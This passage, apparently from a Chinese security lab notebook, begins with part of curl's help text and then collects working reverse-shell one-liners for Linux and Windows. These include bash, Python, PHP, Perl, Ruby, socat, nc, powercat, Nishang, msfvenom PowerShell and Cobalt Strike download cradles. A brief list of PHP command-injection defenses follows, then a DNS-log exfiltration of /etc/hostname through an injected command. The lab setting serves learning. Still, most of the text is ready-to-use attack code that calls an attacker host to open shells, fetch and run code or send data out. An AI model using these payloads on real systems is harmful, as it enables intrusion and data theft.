     --proxy-tlsv1   Use TLSv1 for HTTPS proxy
 -U, --proxy-user <user:password> Proxy user and password
     --proxy1.0 <host[:port]> Use HTTP/1.0 proxy on given port
 -p, --proxytunnel   Operate through an HTTP proxy tunnel (using CONNECT)
     --pubkey <key>  SSH Public key file name
 -Q, --quote         Send command(s) to server before transfer
     --random-file <file> File for reading random data from
 -r, --range <range> Retrieve only the bytes within RANGE
     --raw           Do HTTP "raw"; no transfer decoding
 -e, --referer <URL> Referrer URL
 -J, --remote-header-name Use the header-provided filename
 -O, --remote-name   Write output to a file named as the remote file
     --remote-name-all Use the remote file name for all URLs
 -R, --remote-time   Set the remote file's time on the local output
 -X, --request <command> Specify request command to use
     --request-target Specify the target for this request
     --resolve <host:port:address[,address]...> Resolve the host+port to this address
     --retry <num>   Retry request if transient problems occur
     --retry-connrefused Retry on connection refused (use with --retry)
     --retry-delay <seconds> Wait time between retries
     --retry-max-time <seconds> Retry only within this period
     --sasl-authzid <identity>  Use this identity to act as during SASL PLAIN authentication
     --sasl-ir       Enable initial response in SASL authentication
     --service-name <name> SPNEGO service name
 -S, --show-error    Show error even when -s is used
 -s, --silent        Silent mode
     --socks4 <host[:port]> SOCKS4 proxy on given host + port
     --socks4a <host[:port]> SOCKS4a proxy on given host + port
     --socks5 <host[:port]> SOCKS5 proxy on given host + port
     --socks5-basic  Enable username/password auth for SOCKS5 proxies
     --socks5-gssapi Enable GSS-API auth for SOCKS5 proxies
     --socks5-gssapi-nec Compatibility with NEC SOCKS5 server
     --socks5-gssapi-service <name> SOCKS5 proxy service name for GSS-API
     --socks5-hostname <host[:port]> SOCKS5 proxy, pass host name to proxy
 -Y, --speed-limit <speed> Stop transfers slower than this
 -y, --speed-time <seconds> Trigger 'speed-limit' abort after this time
     --ssl           Try SSL/TLS
     --ssl-allow-beast Allow security flaw to improve interop
     --ssl-no-revoke Disable cert revocation checks (Schannel)
     --ssl-reqd      Require SSL/TLS
 -2, --sslv2         Use SSLv2
 -3, --sslv3         Use SSLv3
     --stderr        Where to redirect stderr
     --styled-output Enable styled output for HTTP headers
     --suppress-connect-headers Suppress proxy CONNECT response headers
     --tcp-fastopen  Use TCP Fast Open
     --tcp-nodelay   Use the TCP_NODELAY option
 -t, --telnet-option <opt=val> Set telnet option
     --tftp-blksize <value> Set TFTP BLKSIZE option
     --tftp-no-options Do not send any TFTP options
 -z, --time-cond <time> Transfer based on a time condition
     --tls-max <VERSION> Set maximum allowed TLS version
     --tls13-ciphers <list> TLS 1.3 ciphersuites (OpenSSL)
     --tlsauthtype <type> TLS authentication type
     --tlspassword   TLS password
     --tlsuser <name> TLS user name
 -1, --tlsv1         Use TLSv1.0 or greater
     --tlsv1.0       Use TLSv1.0 or greater
     --tlsv1.1       Use TLSv1.1 or greater
     --tlsv1.2       Use TLSv1.2 or greater
     --tlsv1.3       Use TLSv1.3 or greater
     --tr-encoding   Request compressed transfer encoding
     --trace <file>  Write a debug trace to FILE
     --trace-ascii <file> Like --trace, but without hex output
     --trace-time    Add time stamps to trace/verbose output
     --unix-socket <path> Connect through this Unix domain socket
 -T, --upload-file <file> Transfer local FILE to destination
     --url <url>     URL to work with
 -B, --use-ascii     Use ASCII/text transfer
 -u, --user <user:password> Server user and password
 -A, --user-agent <name> Send User-Agent <name> to server
 -v, --verbose       Make the operation more talkative
 -V, --version       Show version number and quit
 -w, --write-out <format> Use output FORMAT after completion
     --xattr         Store metadata in extended file attributes

```

Kali开启apache服务，把bash命令写入html文件，只要文本包含bash一句话即可。

```bash
curl 192.168.2.103/bash.html|bash
```

![image-20221008152712455](http://cdn.ayusummer233.top/img/image-20221008152712455.png)

##### 4.whois反弹

kali:

![image-20221008152829814](http://cdn.ayusummer233.top/img/image-20221008152829814.png)

```bash
whois -h 192.168.2.102 -p 4444 `pwd` //反弹的shell只能执行后面带的命令（命令会在本地执行，结果传给远程）  如果不给命令加``  则直接显示命令，并不执行
```

kali执行：

![image-20221008153355060](http://cdn.ayusummer233.top/img/image-20221008153355060.png)

ubuntu监听：

![image-20221008153329942](http://cdn.ayusummer233.top/img/image-20221008153329942.png)

##### 5.python反弹

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.221",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'   #连接到远程，并开启一个交互式的bash
```

kali:

![image-20221008153947404](http://cdn.ayusummer233.top/img/image-20221008153947404.png)

ubuntu监听:(连接的断开需要由ubuntu执行ctrl+c)

![image-20221008154010815](http://cdn.ayusummer233.top/img/image-20221008154010815.png)

##### 6.php反弹

php反弹shell和python的方式差不多

```bash
php -r '$sock=fsockopen("192.168.1.221",9001);exec("/bin/sh -i <&3 >&3 2>&3");'
```

kali:

![image-20221008154323395](http://cdn.ayusummer233.top/img/image-20221008154323395.png)

ubuntu监听:(连接的断开需要由ubuntu执行ctrl+c)

![image-20221008154010815](http://cdn.ayusummer233.top/img/image-20221008154010815.png)

##### 7.java反弹

偶尔有时命令执行有效负载`Runtime.getRuntime().exec()`失败. 使用 web shells, 反序列化漏洞或其他向量时可能会发生这种情况.

有时这是因为重定向和管道字符的使用方式在正在启动的进程的上下文中没有意义. 例如 `ls > dir_listing` 在shell中执行应该将当前目录的列表输出到名为的文件中 `dir_listing`. 但是在 `exec()` 函数的上下文中,该命令将被解释为获取 `>` 和 `dir_listing` 目录.

其他时候,其中包含空格的参数会被StringTokenizer类破坏.该类将空格分割为命令字符串. 那样的东西 `ls "My Directory"` 会被解释为 `ls '"My' 'Directory"'`.

在Base64编码的帮助下, 下面的转换器可以帮助减少这些问题. 它可以通过调用Bash或PowerShell再次使管道和重定向更好,并且还确保参数中没有空格.

bash -i >& /dev/tcp/192.168.1.62/9001 0>&1  bash形式的base64编码

bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuNjIvOTAwMSAwPiYx}|{base64,-d}|{bash,-i}

```
java.lang.Runtime.exec('bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuNjIvOTAwMSAwPiYx}|{base64,-d}|{bash,-i}')
```

##### 8.ruby反弹

```
ruby -rsocket -e'f=TCPSocket.open("192.168.1.221",9001).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

能连接上但是报了sh: 1: 5: Bad file descriptor，估计是f的格式不对

##### 9.socat反弹

```
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.1.221:9001
```

kali:

![image-20221008161330615](http://cdn.ayusummer233.top/img/image-20221008161330615.png)

ubuntu监听:(连接的断开需要由ubuntu执行ctrl+c)

![image-20221008161304589](http://cdn.ayusummer233.top/img/image-20221008161304589.png)

##### 10.Perl反弹

```
perl -e 'use Socket;$i="192.168.1.221";$p=9001;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

kali:

![image-20221008161557413](http://cdn.ayusummer233.top/img/image-20221008161557413.png)

ubuntu监听：连接的断开需要由ubuntu发起

![image-20221008161547214](http://cdn.ayusummer233.top/img/image-20221008161547214.png)

##### Windows下反弹shell

##### 1.powercat反弹

```
powercat is a powershell function.  First you need to load the function before you can execute it.  You can put one of the below commands into your powershell profile so powercat is automatically loaded when powershell starts.
###
    Load The Function From Downloaded .ps1 File:
        . .\powercat.ps1
    Load The Function From URL:
        IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')
```

powercat下载地址：https://github.com/besimorhino/powercat //下载到本地执行

```
### Parameters:
    -l      Listen for a connection.                             [Switch]
    -c      Connect to a listener.                               [String]
    -p      The port to connect to, or listen on.                [String]
    -e      Execute. (GAPING_SECURITY_HOLE)                      [String]   创建连接后执行的程序文件
    -ep     Execute Powershell.                                  [Switch]
    -r      Relay. Format: "-r tcp:10.1.1.1:443"                 [String]
    -u      Transfer data over UDP.                              [Switch]
    -dns    Transfer data over dns (dnscat2).                    [String]
    -dnsft  DNS Failure Threshold.                               [int32]
    -t      Timeout option. Default: 60                          [int32]
    -i      Input: Filepath (string), byte array, or string.     [object]
    -o      Console Output Type: "Host", "Bytes", or "String"    [String]
    -of     Output File Path.                                    [String]
    -d      Disconnect after connecting.                         [Switch]
    -rep    Repeater. Restart after disconnecting.               [Switch]
    -g      Generate Payload.                                    [Switch]
    -ge     Generate Encoded Payload.                            [Switch]
    -h      Print the help message.                              [Switch]
```

powercat为Powershell版的Netcat，实际上是一个powershell的函数，使用方法类似Netcat

进入文件夹，在地址栏输入powershell进入powershell模式

Import-Module ./powercat.ps1

如果报错：Import-Module : 无法加载文件 C:\Users\Administrator\Desktop\powercat-master\powercat.ps1，因为在此系统上禁止运行脚本。

打开管理员模式：鼠标放在开始上，右键管理员模式

或者在地址栏powershell  按住shift +enter进入管理员模式

执行:set-ExecutionPolicy RemoteSigned

输入Y

![image-20221008162735066](http://cdn.ayusummer233.top/img/image-20221008162735066.png)

![image-20221008162848916](http://cdn.ayusummer233.top/img/image-20221008162848916.png)

windows端：

![image-20221008163706553](http://cdn.ayusummer233.top/img/image-20221008163706553.png)

ubuntu监听：

![image-20221008163733736](http://cdn.ayusummer233.top/img/image-20221008163733736.png)

两者都可以主动发起中断请求

##### 2.NC反弹

nc.exe 192.168.1.221 9001 -e c:\windows\system32\cmd.exe   需要安装nc程序

##### 3.nishang反弹

Nishang下载地址：https://github.com/samratashok/nishang

Nishang是一个基于PowerShell的攻击框架，整合了一些PowerShell攻击脚本和有效载荷，可反弹TCP/ UDP/ HTTP/HTTPS/ ICMP等类型shell

windows端：

将nishang下载到攻击者本地，在目标机使用powershell执行以下命令

```
IEX (New-Object Net.WebClient).DownloadString('https://github.com/samratashok/nishang/Shells/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 192.168.1.221 -port 9001
```

Import-Module .\Invoke-PowerShellTcp.ps1

Invoke-PowerShellTcp -Reverse -IPAddres 192.168.1.221 -port 9001

![image-20221008165925548](http://cdn.ayusummer233.top/img/image-20221008165925548.png)

ubuntu攻击端监听：（需要ubuntu主动断开）

![image-20221008165752495](http://cdn.ayusummer233.top/img/image-20221008165752495.png)

##### 4.Reverse UDP shell反弹

windows端：

还是下载nishang，在目标机使用powershell执行以下命令

Import-Module .\Invoke-PowerShellUdp.ps1

Invoke-PowerShellUdp -Reverse -IPAddres 192.168.1.221 -port 9001

或者

```
IEX (New-Object Net.WebClient).DownloadString('https://github.com/samratashok/nishang/Shells/Invoke-PowerShellUdp.ps1');  #这里可以将文件下载到攻击机上，攻击机开启http服务，靶机只需要访问http服务器上的文件即可，不用去外网

Invoke-PowerShellUdp -Reverse -IPAddress 192.168.1.221 -port 9002
```

![image-20221008172418154](http://cdn.ayusummer233.top/img/image-20221008172418154.png)

![image-20221008172150102](http://cdn.ayusummer233.top/img/image-20221008172150102.png)

ubuntu攻击端：监听端口  nc -lnvup 9001   需要ubuntu主动断开连接

![image-20221008172219988](http://cdn.ayusummer233.top/img/image-20221008172219988.png)



##### 5.MSF反弹  

需要处理的信息很多，可能需要等待几秒

kali可以使用 msfvenom -l 结合关键字过滤（如cmd/windows/reverse），找出我们需要的各类反弹一句话payload的路径信息。

```
msfvenom -l payloads | grep 'cmd/windows/reverse'
```

![image-20221008172848323](http://cdn.ayusummer233.top/img/image-20221008172848323.png)



依照前面查找出的命令生成一句话payload路径，我们使用如下的命令生成反弹一句话

msfvenom -p cmd/windows/reverse_powershell LHOST=192.168.1.221 LPORT=9001

![image-20221008173034650](http://cdn.ayusummer233.top/img/image-20221008173034650.png)

然后复制粘贴到靶机上运行

上面的无法运行，会报错

```powershell
powershell -w hidden -nop -c function RSC{if ($c.Connected -eq $true){$c.Close()};if ($p.ExitCode -ne$null){$p.Close()};exit;};$a='192.168.1.221';$p='9001';$c=New-Object system.net.sockets.tcpclient;$c.connect($a,$p); $s=$c.GetStream(); $nb=New-Object System.Byte[] $c.ReceiveBufferSize;$p=New-Object System.Diagnostics.Process;$p.StartInfo.FileName='cmd.exe' ;$p.StartInfo.RedirectStandardInput=1;$p.StartInfo.RedirectStandardOutput=1;$p.StartInfo.UseShellExecute=0;$p.Start();$is=$p.StandardInput;$os=$p.StandardOutput;Start-Sleep 1;$e=new-object System.Text.AsciiEncoding;while($os.Peek() -ne -1){$o += $e.GetString($os.Read())} ;$s.write($e.GetBytes($o),0,$o.Length);$o=$null;$d=$false;$t=0;while (-not $d) {if($c.Connected -ne $true){RSC};$pos=0;$i=1; while (($i -gt 0) -and ($pos -lt $nb.Length)){$r=$s.Read($nb,$pos,$nb.Length - $pos);$pos+=$r;if (-not $pos -or $pos -eq 0){RSC};if ($nb[0..$($pos-1)] -contains 10) {break}};if ($pos -gt 0){$str=$e.GetString($nb,0,$pos);$is.write($str);start-sleep 1;if ($p.ExitCode -ne $null){RSC}else{$o=$e.GetString($os.Read());while($os.Peek()-ne -1){$o += $e.GetString($os.Read());if ($o -eq $str){$o=""}}; $s.Write($e.GetBytes($o),0,$o.length) ;$o=Snull;$str=$null}}else{RSC}};
```

会报很多错误，但是可以反弹shell

![image-20221008180002544](http://cdn.ayusummer233.top/img/image-20221008180002544.png)

ubuntu监听：

![image-20221008175009702](http://cdn.ayusummer233.top/img/image-20221008175009702.png)

##### 6.Cobalt Strike 反弹shell

[Cobalt Strike使用教程一_小白白@的博客-CSDN博客_cobalt strike](https://blog.csdn.net/weixin_44677409/article/details/102725129)

Cobalt strike的Scripted Web Delivery模块，可通过bitsadmin、powershell、python、regsvR32等进行反弹shell，类似metasploit的web_delivery模块

kali运行cobaltstrike的服务端：

![image-20221008192555554](http://cdn.ayusummer233.top/img/image-20221008192555554.png)

windows运行客户端，cobaltstrike.exe

![image-20221008192716373](http://cdn.ayusummer233.top/img/image-20221008192716373.png)

<img src="http://cdn.ayusummer233.top/img/image-20221008192745693.png" alt="image-20221008192745693" style="zoom:67%;" />

客户端开启监听

点击Cobalt Strike->Listeners

payload可选择windows/beacon_http/reverse_http

说明：其中windows/beacon 是Cobalt Strike自带的模块，包括dns,http,https,smb四种方式的监听器，windows/foreign 为外部监听器，即msf或者Armitage的监听器。

HTTP端口（上线）需要不能被占用

<img src="http://cdn.ayusummer233.top/img/image-20221008192921020.png" alt="image-20221008192921020" style="zoom: 50%;" />

<img src="http://cdn.ayusummer233.top/img/image-20221008193019660.png" alt="image-20221008193019660" style="zoom:50%;" />



生成powershell payload:

点击Attack -> Web Drive-by -> Scripted Web Delivery

Type选择 powershell

端口需要不能被占用，成功后得到payload

<img src="http://cdn.ayusummer233.top/img/image-20221008193134974.png" alt="image-20221008193134974" style="zoom:80%;" /><img src="http://cdn.ayusummer233.top/img/image-20221008193209631.png" alt="image-20221008193209631" style="zoom:80%;" />![image-20221008193319386](http://cdn.ayusummer233.top/img/image-20221008193319386.png)



```
powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://100.1.1.121:8889/a'))"
```

生成代码已经给出了，在windows上执行

![image-20221008193426532](http://cdn.ayusummer233.top/img/image-20221008193426532.png)

![image-20221008193603274](http://cdn.ayusummer233.top/img/image-20221008193603274.png)

进入后输入命令 可能需要等待几秒

![image-20221008194329492](http://cdn.ayusummer233.top/img/image-20221008194329492.png)

![image-20221008194915362](http://cdn.ayusummer233.top/img/image-20221008194915362.png)

kali:

![](http://cdn.ayusummer233.top/img/image-20221008194503778.png)

### 防范措施

> 1. 在PHP下禁用高危系统函数
>    找到php.ini，查找到disable_functions，添加禁用的函数名
> 2. 参数的值尽量使用引号包括，并在拼接前调用addslashes进行转义
> 3. 不执行外部的应用程序或命令
>    尽量使用自定义函数或函数库实现外部应用程序或命令的功能。在执行system、eval等命令执行功能的函数前，要确认参数内容
> 4. 使用escapeshellarg函数处理相关参数
>    escapeshellarg函数会将用户引起参数或命令结束的字符进行转义，如单引号"’“会被转义为”\’"，双引号“””会被转义为"""，分号";“会被转义为”;"，这样escapeshellarg会将参数内容限制在一对单引号或双引号里面，转义参数中包括的单引号或双引号，使其无法对当前执行进行截断，实现防范命令注入攻击的目的
> 5. 使用safe_mode_exec_dir指定可执行的文件路径
>    将php.ini文件中的safe_mode设置为On，然后将允许执行的文件放入一个目录，并使用safe_mode_exec_dir指定这个可执行的文件路径；这样，在需要执行相应的外部程序时，程序必须在safe_mode_exec_dir指定的目录中才会允许执行，否则执行将失败

### 漏洞复现

#### dnslog外带

1.登录存在命令执行漏洞的页面

![image-20220930171724686](http://cdn.ayusummer233.top/img/image-20220930171724686.png)

测试

![image-20220930171756626](http://cdn.ayusummer233.top/img/image-20220930171756626.png)

猜测后台页面是读取表单内的输入，然后使用一个有完整回显的命令执行函数类似shell_exec()或者``

尝试注入EXP实现DNSlog外带

```
cat /etc/hostname| xxd -p -c 16 | while read exfil; do host $exfil.jvTA.test.cn 100.1.1.121; done
```

此命令会将/etc/hostname的内容打印，然后将内容进行16进制转储后作为read的输入，赋值给变量exfil，随后向100.1.1.121（dnslog服务器）发起携带敏感信息的域名解析请求

![image-20220930172914101](http://cdn.ayusummer233.top/img/image-20220930172914101.png)

查看DNSlog平台得到日志

![image-20220930172946471](http://cdn.ayusummer233.top/img/image-20220930172946471.png)